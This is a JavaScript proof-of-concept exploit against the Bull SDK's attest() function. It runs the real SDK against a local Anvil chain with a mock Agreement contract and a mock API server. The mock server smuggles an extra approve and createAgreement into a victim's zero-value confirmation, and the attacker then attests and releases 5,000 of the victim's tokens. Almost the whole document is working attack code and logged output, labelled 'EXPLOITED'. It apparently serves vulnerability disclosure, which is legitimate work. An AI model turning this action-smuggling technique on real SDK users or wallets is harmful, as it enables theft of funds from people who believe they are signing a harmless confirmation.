// PoC runner: Bull SDK attest() executes smuggled actions from the server.
// The victim calls bull.attest("1") to confirm delivery on a legit agreement.
// attest() filters the server-returned actions only by from == me and
// name != "object" (the server controls the name), then passes each action
// straight to #send() with default maxWei=0 and no spenderOnly. #guard
// permits an approve(token -> Agreement, < 2**200) and any value-0 call to
// the Agreement contract, so a smuggled approve + createAgreement pair sails
// through. The victim intended a ZERO-VALUE confirmation and instead locked
// 5,000 tokens into an attacker-controlled agreement. The attacker attests
// and releases them to themselves.
//
// Threat model (the SDK's own): "the API server is not trusted with your
// wallet. Every transaction it returns is checked before it is sent."
//
// Runs the REAL Bull SDK (bull-sdk.mjs, verbatim) against a LOCAL Anvil
// chain, a mock Agreement contract implementing the DOCUMENTED semantics
// (llms.txt) and a mock Bull API. The real BullAgreement source is NOT
// verified anywhere, so the mock mirrors the documented behavior; the claim
// proven here is the SDK's missing verification, demonstrated with the real
// SDK. No real funds, no mainnet.
//
//   1. Deploy MockAgreement (etched at the production Agreement address so
//      the REAL SDK's guard accepts it) + MockERC20 (18 decimals).
//   2. Victim holds 10,000 tokens; creates legit agreement 1 directly
//      (pay 500 to contractor, attest by victim).
//   3. Victim calls bull.attest("1") via the REAL SDK. The mock API returns
//      the legit attest action PLUS 2 smuggled actions (approve + a new
//      agreement paying 5,000 to the attacker, attest-by-attacker).
//   4. Attacker attests (id 2, index 0) then releases id 2.
//   5. Result: attacker holds 5,000 tokens; victim holds 4,500.
//
// Expected output: EXPLOITED.
import { readFileSync, writeFileSync } from "node:fs";
import {
  createPublicClient, createWalletClient, defineChain, http, parseAbi,
  formatUnits, parseUnits,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { Bull } from "./bull-sdk.mjs";
import { startMockApi } from "./mock-api.mjs";

const ANVIL_RPC = "http://127.0.0.1:8547"; // fresh Anvil per run — never reuse a chain where an earlier PoC already created agreement 1 (stale released flag + conditions array would collide via the etched mock's storage)
const MOCK_API_PORT = 8792;

const anvil = defineChain({
  id: 31337, name: "anvil",
  nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  rpcUrls: { default: { http: [ANVIL_RPC] } },
});

const tokenAbi = parseAbi([
  "function mint(address to, uint256 amount)",
  "function balanceOf(address) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
]);
const agreementAbi = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash) p, (uint8 kind,address by)[] conds) payable returns (uint256 id)",
  "function attest(uint256 id, uint256 index)",
  "function release(uint256 id)",
  "function agreement(uint256 id) view returns (address payer, address payee, address asset, uint256 amount, uint64 expiry, bytes32 termsHash)",
]);

function loadArtifact(file, name) {
  const j = JSON.parse(readFileSync(`./chain/out/${file}/${name}.json`, "utf8"));
  return { abi: j.abi, bytecode: j.bytecode.object };
}

const log = (...a) => console.log(...a);

async function main() {
  const victim = privateKeyToAccount(generatePrivateKey());
  const attacker = privateKeyToAccount(generatePrivateKey());
  const contractor = privateKeyToAccount(generatePrivateKey());
  const pub = createPublicClient({ chain: anvil, transport: http() });
  const victimWallet = createWalletClient({ account: victim, chain: anvil, transport: http() });
  const attackerWallet = createWalletClient({ account: attacker, chain: anvil, transport: http() });
  for (const a of [victim, attacker, contractor]) {
    await pub.request({ method: "anvil_setBalance", params: [a.address, "0x21e19e0c9bab2400000"] });
  }

  // Deploy MockERC20 + MockAgreement.
  const tokenArt = loadArtifact("Mocks.sol", "MockERC20");
  const agreementArt = loadArtifact("MockAgreement.sol", "MockAgreement");
  const tokenHash = await victimWallet.deployContract({ abi: tokenArt.abi, bytecode: tokenArt.bytecode, args: [] });
  const usdc = (await pub.waitForTransactionReceipt({ hash: tokenHash })).contractAddress;
  const agreementHash = await victimWallet.deployContract({
    abi: agreementArt.abi, bytecode: agreementArt.bytecode,
    args: [attacker.address, attacker.address], // treasury, feeSigner
  });
  const deployedAgreement = (await pub.waitForTransactionReceipt({ hash: agreementHash })).contractAddress;
  // The SDK hardcodes the production Agreement address in its safety guard,
  // so the mock must live there for the REAL SDK to accept its transactions.
  const PROD_AGREEMENT = "0xef9cEeB6594504ADe1ec903A7A29a2BFe38EFC8B";
  const deployedCode = await pub.getCode({ address: deployedAgreement });
  await pub.request({ method: "anvil_setCode", params: [PROD_AGREEMENT, deployedCode] });
  const one = "0x0000000000000000000000000000000000000000000000000000000000000001";
  await pub.request({ method: "anvil_setStorageAt", params: [PROD_AGREEMENT, "0x0000000000000000000000000000000000000000000000000000000000000000", one] });
  const agreement = PROD_AGREEMENT;
  log("usdc (MockERC20, 18 dec):", usdc);
  log("agreement (MockAgreement, etched at prod address):", agreement);
  log("victim:", victim.address, "— holds 10,000 tokens; legit agreement 1 pays 500 to contractor", contractor.address, "on victim attestation");
  log("attacker:", attacker.address);

  // Victim holds 10,000 tokens.
  await victimWallet.writeContract({ address: usdc, abi: tokenAbi, functionName: "mint", args: [victim.address, parseUnits("10000", 18)] });

  // Setup: victim creates legit agreement 1 directly (approve + createAgreement).
  const now = Math.floor(Date.now() / 1000);
  const termsHash = "0xcf3cb940a68494b7e1a7432ee04b99982a19c6ca6abea314403e0ecfef12a4c2";
  await victimWallet.writeContract({
    address: usdc, abi: tokenAbi, functionName: "approve",
    args: [agreement, parseUnits("500", 18)],
  });
  const createHash = await victimWallet.writeContract({
    address: agreement, abi: agreementAbi, functionName: "createAgreement",
    args: [
      { payee: contractor.address, asset: usdc, amount: parseUnits("500", 18), expiry: BigInt(now + 72 * 3600), termsHash },
      [{ kind: 1, by: victim.address }],
    ],
  });
  await pub.waitForTransactionReceipt({ hash: createHash });
  log("legit agreement 1 created on-chain (500 to contractor, attest by victim)");

  const server = await startMockApi({
    port: MOCK_API_PORT, agreement, usdc, attacker: attacker.address, victim: victim.address,
  });
  log("mock Bull API listening on 127.0.0.1:" + MOCK_API_PORT);

  // Victim attests agreement 1 through the REAL SDK — expecting a zero-value
  // confirmation. The mock API returns the legit action + 2 smuggled actions.
  const bull = new Bull({ walletClient: victimWallet, publicClient: pub, baseUrl: `http://127.0.0.1:${MOCK_API_PORT}` });
  const victimBefore = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  log("victim token balance before attest():", formatUnits(victimBefore, 18));
  let hashes;
  try {
    hashes = await bull.attest("1");
    log("SDK attest() returned", hashes.length, "tx hashes — NO ERROR, NO WARNING about the 2 smuggled actions");
  } catch (e) {
    log("SDK threw:", e.message);
    process.exit(2);
  }

  // Read the smuggled on-chain agreement (id 2) to show what was created.
  const a = await pub.readContract({ address: agreement, abi: agreementAbi, functionName: "agreement", args: [2n] });
  log("smuggled agreement 2: payer", a[0], "payee", a[1], "(attacker was", attacker.address + ")", "amount", formatUnits(a[3], 18));
  log("payee == attacker ?", a[1].toLowerCase() === attacker.address.toLowerCase());

  // Attacker attests (the condition names them) and releases the funds.
  await attackerWallet.writeContract({ address: agreement, abi: agreementAbi, functionName: "attest", args: [2n, 0n] });
  await attackerWallet.writeContract({ address: agreement, abi: agreementAbi, functionName: "release", args: [2n] });
  log("attacker attested + released smuggled agreement 2");

  const victimTokens = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [victim.address] });
  const attackerTokens = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [attacker.address] });
  const contractorTokens = await pub.readContract({ address: usdc, abi: tokenAbi, functionName: "balanceOf", args: [contractor.address] });
  log("victim token balance:", formatUnits(victimTokens, 18), "(10,000 - 500 legit lock - 5,000 stolen)");
  log("attacker token balance:", formatUnits(attackerTokens, 18));
  log("contractor token balance:", formatUnits(contractorTokens, 18), "(agreement 1 still open, not yet released)");

  const result = {
    poc: "Bull SDK attest() — smuggled approve + createAgreement actions executed, victim locks 5,000 tokens to attacker",
    sdk: "bull-sdk.mjs (verbatim copy of https://www.bull.family/sdk/bull.mjs)",
    agreement: "MockAgreement.sol (implements the DOCUMENTED Agreement semantics from llms.txt; real BullAgreement source is unverified)",
    legitAgreementId: "1",
    smuggledAgreementId: "2",
    smuggledPayee: a[1],
    smuggledPayeeIsAttacker: a[1].toLowerCase() === attacker.address.toLowerCase(),
    smuggledAmount: formatUnits(a[3], 18),
    attestTxCount: hashes.length,
    victimBalanceBefore: formatUnits(victimBefore, 18),
    victimBalanceAfter: formatUnits(victimTokens, 18),
    attackerBalanceAfter: formatUnits(attackerTokens, 18),
    contractorBalanceAfter: formatUnits(contractorTokens, 18),
    exploited: a[1].toLowerCase() === attacker.address.toLowerCase() && attackerTokens === parseUnits("5000", 18),
  };
  writeFileSync("./poc-result.json", JSON.stringify(result, null, 2));
  log("\n=== RESULT ===");
  log(result.exploited
    ? "EXPLOITED: victim called attest() for a zero-value confirmation, but the SDK also sent a smuggled approve + createAgreement locking 5,000 tokens to the attacker; attacker released all 5,000."
    : "NOT EXPLOITED — see poc-result.json");
  log("poc-result.json written.");
  server.close();
  process.exit(result.exploited ? 0 : 1);
}

main().catch((e) => { console.error("PoC crashed:", e); process.exit(3); });
